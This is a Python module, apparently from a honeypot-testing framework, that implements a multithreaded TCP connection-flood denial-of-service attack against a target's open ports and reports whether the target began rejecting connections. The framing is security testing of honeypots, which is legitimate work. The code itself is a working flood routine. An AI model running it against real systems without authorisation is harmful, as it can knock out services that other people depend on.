import socket
import time

from threading import Thread
from typing import TypeAlias
from .base_attack import AttackResults, BaseAttack, BaseHoneypot

PortSet: TypeAlias = set[int]


class DoS(BaseAttack):
    def __init__(self, honeypot: BaseHoneypot) -> None:
        """
        Initializes a new DoSAllOpenPorts object.

        Args:
            honeypot (BaseHoneypot): Honeypot object to get the information
                                     for performing the DoS on the honeypot.
        """
        super().__init__(honeypot)
        self.honeypot_rejecting_connections: bool = False
        self.honeypot_ports: PortSet = honeypot.ports
        self.num_threads: int = 40

    def start_connections(self) -> None:
        """
        Attempt to flood the honeypot with connections until
        it starts rejecting them.
        """
        while not self.honeypot_rejecting_connections:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            for port in self.honeypot_ports:
                try:
                    sock.connect((self.honeypot.ip, port))
                    sock.send(b"A")
                    sock.recv(1024)
                    time.sleep(0.01)
                except Exception:
                    self.honeypot_rejecting_connections = True
                    break
                finally:
                    sock.close()

    def manage_attack(self) -> None:
        """
        Creates a thread pool to manage each thread flooding the honeypot
        with connections.
        """
        threads: list[Thread] = [Thread(target=self.start_connections)
                                 for _ in range(self.num_threads)]
        for thread in threads:
            thread.start()
        while not self.honeypot_rejecting_connections:
            time.sleep(1)
        for thread in threads:
            thread.join()

    def run_attack(self) -> AttackResults:
        """
        Launch the DoS attack using multiple threads.

        Returns:
            AttackResults: The results of the attack.
        """
        print(f"Running DoS attack on {self.honeypot.ip} and "
              f"ports: {self.honeypot_ports}")
        start_time: float = time.time()
        self.manage_attack()
        end_time: float = time.time()
        time_taken: float = end_time - start_time
        if self.honeypot_rejecting_connections:
            return (True,
                    "Vulnerability found: DoS attack made the honeypot "
                    "reject connections",
                    time_taken,
                    self.num_threads)
        else:
            return (False,
                    "Vulnerability not found: DoS attack did not make the "
                    "honeypot reject connections",
                    time_taken,
                    self.num_threads)
